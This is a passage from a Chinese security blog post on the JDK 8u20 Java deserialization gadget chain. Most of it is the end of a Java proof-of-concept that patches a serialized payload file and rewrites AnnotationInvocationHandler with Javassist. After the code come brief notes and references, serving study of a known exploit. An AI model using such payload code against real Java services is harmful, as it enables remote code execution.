+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>filename</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;8u20.ser&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>ser</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Serializer</span><span class=p>.</span><span class=na>serialize</span><span class=p>(</span><span class=n>set</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>shoudReplace</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=p>{</span><span class=n>0x78</span><span class=p>,</span><span class=n>0x70</span><span class=p>,</span><span class=n>0x77</span><span class=p>,</span><span class=n>0x04</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x00</span><span class=p>,</span><span class=n>0x78</span><span class=p>,</span><span class=n>0x71</span><span class=p>};</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>findSubarray</span><span class=p>(</span><span class=n>ser</span><span class=p>,</span><span class=w> </span><span class=n>shoudReplace</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ser</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>deleteBytes</span><span class=p>(</span><span class=n>ser</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=n>2</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>FileOutputStream</span><span class=w> </span><span class=n>fos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>FileOutputStream</span><span class=p>(</span><span class=n>filename</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>fos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>ser</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>createModifiedHandlerClass</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>cc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtMethod</span><span class=w> </span><span class=n>writeObject</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>CtMethod</span><span class=p>.</span><span class=na>make</span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;private void writeObject(java.io.ObjectOutputStream out) throws java.io.IOException {&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;    out.defaultWriteObject();&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=s>&#34;}&#34;</span><span class=p>,</span><span class=w> </span><span class=n>cc</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cc</span><span class=p>.</span><span class=na>addMethod</span><span class=p>(</span><span class=n>writeObject</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>cc</span><span class=p>.</span><span class=na>toClass</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setFieldValue</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>field</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>obj</span><span class=p>.</span><span class=na>getClass</span><span class=p>().</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=n>field</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>f</span><span class=p>.</span><span class=na>set</span><span class=p>(</span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>findSubarray</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>array</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>subarray</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>array</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>subarray</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>boolean</span><span class=w> </span><span class=n>match</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>subarray</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=n>j</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>array</span><span class=o>[</span><span class=n>i</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>j</span><span class=o>]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>subarray</span><span class=o>[</span><span class=n>j</span><span class=o>]</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>match</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=k>break</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>match</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>i</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>deleteBytes</span><span class=p>(</span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>array</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>count</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>newArray</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>array</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>count</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>arraycopy</span><span class=p>(</span><span class=n>array</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>newArray</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>index</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>arraycopy</span><span class=p>(</span><span class=n>array</span><span class=p>,</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>count</span><span class=p>,</span><span class=w> </span><span class=n>newArray</span><span class=p>,</span><span class=w> </span><span class=n>index</span><span class=p>,</span><span class=w> </span><span class=n>array</span><span class=p>.</span><span class=na>length</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>index</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>count</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>newArray</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/jdk8u20-deserialization/9.png width=1768 height=1318 loading=lazy alt=img></p><p>这里有一个坑点就是我们不能直接在poc中反序列化，如果这样的话是必然会失败的，我看到</p><p><img src=/p/jdk8u20-deserialization/10.png width=1926 height=1134 loading=lazy alt=img></p><p>这一看就不对了，但是原因是什么，我暂时理解为是我在运行时强行修改导致的。</p><p>还有个面向对象反序列化的工具 <a class=link href=https://github.com/QAX-A-Team/SerialWriter target=_blank rel=noopener>https://github.com/QAX-A-Team/SerialWriter</a>，如果是使用的修改序列化流的话，这个工具非常实用。</p><blockquote><p><a class=link href=https://xz.aliyun.com/news/9065 target=_blank rel=noopener>https://xz.aliyun.com/news/9065</a></p><p><a class=link href=https://xz.aliyun.com/news/1399 target=_blank rel=noopener>https://xz.aliyun.com/news/1399</a></p><p><a class=link href=https://www.inhann.top/2022/09/11/8u20/ target=_blank rel=noopener>https://www.inhann.top/2022/09/11/8u20/</a></p><p><a class=link href=https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/ target=_blank rel=noopener>https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/</a></p><p><a class=link href=https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/ExploitGenerator.java target=_blank rel=noopener>https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/ExploitGenerator.java</a></p></blockquote></section><footer class=article-footer><section class=article-tags></section><section class=article-references><div class=article-references__header><span class=article-references__icon><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+</span><span>参考阅读</span></div><ol class=article-references__list><li><a href=https://xz.aliyun.com/news/9065 target=_blank rel=noopener>https://xz.aliyun.com/news/9065</a></li><li><a href=https://xz.aliyun.com/news/1399 target=_blank rel=noopener>https://xz.aliyun.com/news/1399</a></li><li><a href=https://www.inhann.top/2022/09/11/8u20/ target=_blank rel=noopener>https://www.inhann.top/2022/09/11/8u20/</a></li><li><a href=https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/ target=_blank rel=noopener>https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/</a></li><li><a href=https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/ExploitGenerator.java target=_blank rel=noopener>https://github.com/pwntester/JRE8u20_RCE_Gadget/blob/master/src/main/java/ExploitGenerator.java</a></li></ol></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
